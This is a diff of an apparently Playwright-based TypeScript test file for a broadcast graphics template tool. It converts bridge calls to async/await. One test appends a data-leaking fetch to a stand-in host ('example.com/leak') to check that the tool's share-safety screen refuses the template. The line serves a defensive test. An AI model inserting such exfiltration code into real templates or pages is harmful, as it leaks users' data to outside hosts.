@@ -35,8 +35,8 @@ import JSZip from 'jszip';
 
 type Bridge = {
   hello(): Promise<{ channel: string; v: number }>;
-  types(): Array<{ id: string; neutral: boolean; fields: unknown[]; events: unknown[] }>;
-  scaffold(req: unknown): { template: Template; notes: string[] };
+  types(): Promise<Array<{ id: string; neutral: boolean; fields: unknown[]; events: unknown[] }>>;
+  scaffold(req: unknown): Promise<{ template: Template; notes: string[] }>;
   validate(t: Template, o?: { bench?: boolean }): Promise<{ ok: boolean; benchSkipped: string | null; merged: { errors: { rule: string; message: string }[]; warnings: { rule: string }[] }; readiness: { id: string; state: string }[] }>;
   normalize(t: Template): { template: Template; converted: boolean; dataRegion: boolean; note: string; stepsRewritten?: { from: string; to: string } };
   exportPackage(t: Template, o?: unknown): Promise<Uint8Array>;
@@ -60,7 +60,7 @@ test('hello speaks bridge v1 and the registry summary reads the types', async ({
   const result = await page.evaluate(async () => {
     const b = window.noacgBridge;
     const hello = await b.hello();
-    const types = b.types();
+    const types = await b.types();
     const scoreboard = types.find((t) => t.id === 'scoreboard');
     return { hello, count: types.length, scoreboard, neutralCount: types.filter((t) => t.neutral).length };
   });
@@ -77,7 +77,7 @@ test('the three scaffold paths validate clean with every field id in the markup'
   const result = await page.evaluate(async () => {
     const b = window.noacgBridge;
     const run = async (req: unknown) => {
-      const { template } = b.scaffold(req);
+      const { template } = await b.scaffold(req);
       const v = await b.validate(template, { bench: false });
       return { ok: v.ok, type: template.type, fields: template.fields.map((f) => `${f.field}:${f.ftype}`), ids: template.fields.every((f) => new RegExp(`id="${f.field}"`).test(template.html)), errors: v.merged.errors.map((e) => e.rule), hasMachine: /"machine"\s*:/.test(template.js) };
     };
@@ -103,7 +103,7 @@ test('a dual package round-trips through the bridge and reports a stale generate
   // Export from the page, read back THROUGH the page (the same importer the Import door uses).
   const exported = await page.evaluate(async () => {
     const b = window.noacgBridge;
-    const { template } = b.scaffold({ type: 'scoreboard', design: 'neutral', name: 'Round trip' });
+    const { template } = await b.scaffold({ type: 'scoreboard', design: 'neutral', name: 'Round trip' });
     const bytes = await b.exportPackage(template);
     let bin = '';
     for (let i = 0; i < bytes.length; i += 0x8000) bin += String.fromCharCode(...bytes.subarray(i, i + 0x8000));
@@ -161,7 +161,7 @@ test('normalize converts an authored GSAP region to keyframe data; a bare region
   await toBridge(page);
   const result = await page.evaluate(async () => {
     const b = window.noacgBridge;
-    const { template } = b.scaffold({ type: 'lower-third', design: 'neutral' });
+    const { template } = await b.scaffold({ type: 'lower-third', design: 'neutral' });
     const region = `/* == ANIMATION (generated — the Animation panel rewrites this block) == */
 var animSpeed = 1;
 var easeIn = 'power3.out';
@@ -229,7 +229,7 @@ test('normalize re-derives the SPX steps from a default path an author grew by h
   const result = await page.evaluate(async () => {
     const b = window.noacgBridge;
     const ad = await import('/src/blocks/animData.ts');
-    const { template } = b.scaffold({ fields: [{ label: 'A', kind: 'text' }, { label: 'B', kind: 'text' }], name: 'Grown path' });
+    const { template } = await b.scaffold({ fields: [{ label: 'A', kind: 'text' }, { label: 'B', kind: 'text' }], name: 'Grown path' });
     const data = ad.parseAnimData(template.js)!;
     const [first, last] = [data.steps[0], data.steps[data.steps.length - 1]];
     data.steps = [first, { ...first, name: 'Winner' }, last];
@@ -269,7 +269,7 @@ test('a template the share-safety screen refuses is never benched', async ({ pag
   await toBridge(page);
   const result = await page.evaluate(async () => {
     const b = window.noacgBridge;
-    const { template } = b.scaffold({ type: 'lower-third', design: 'neutral' });
+    const { template } = await b.scaffold({ type: 'lower-third', design: 'neutral' });
     const hostile = { ...template, js: `${template.js}\nfetch('https://example.com/leak?' + document.title);` };
     const v = await b.validate(hostile, { bench: true });
     return { ok: v.ok, benchSkipped: v.benchSkipped, errors: v.merged.errors.map((e) => e.rule), readiness: v.readiness.map((r) => `${r.id}=${r.state}`) };
@@ -284,7 +284,7 @@ test('the stress frame cuts a doubled line at a word and shows every answer row'
   await toBridge(page);
   const stress = await page.evaluate(() => {
     const b = window.noacgBridge;
-    const { template } = b.scaffold({ type: 'quiz-show', design: 'qz13' });
+    const { template } = await b.scaffold({ type: 'quiz-show', design: 'qz13' });
     const idOf = (title: string) => (template.fields as { title: string; field: string }[]).find((f) => f.title === title)!.field;
     const data = b.stressData(template) as Record<string, string>;
     return { question: data[idOf('Question')], shown: data[idOf('Answers shown')] };
@@ -301,7 +301,7 @@ test('the operator surface of a scaffold is derived from its fields and machine'
   await toBridge(page);
   const result = await page.evaluate(() => {
     const b = window.noacgBridge;
-    const { template } = b.scaffold({ type: 'scoreboard', design: 'neutral' });
+    const { template } = await b.scaffold({ type: 'scoreboard', design: 'neutral' });
     const i = b.inspect({ template }) as { descriptors: { key: string; kind: string }[]; buttons: { event: string }[] };
     return { inputs: i.descriptors.map((d) => `${d.key}:${d.kind}`), buttons: i.buttons.map((bt) => bt.event) };
   });
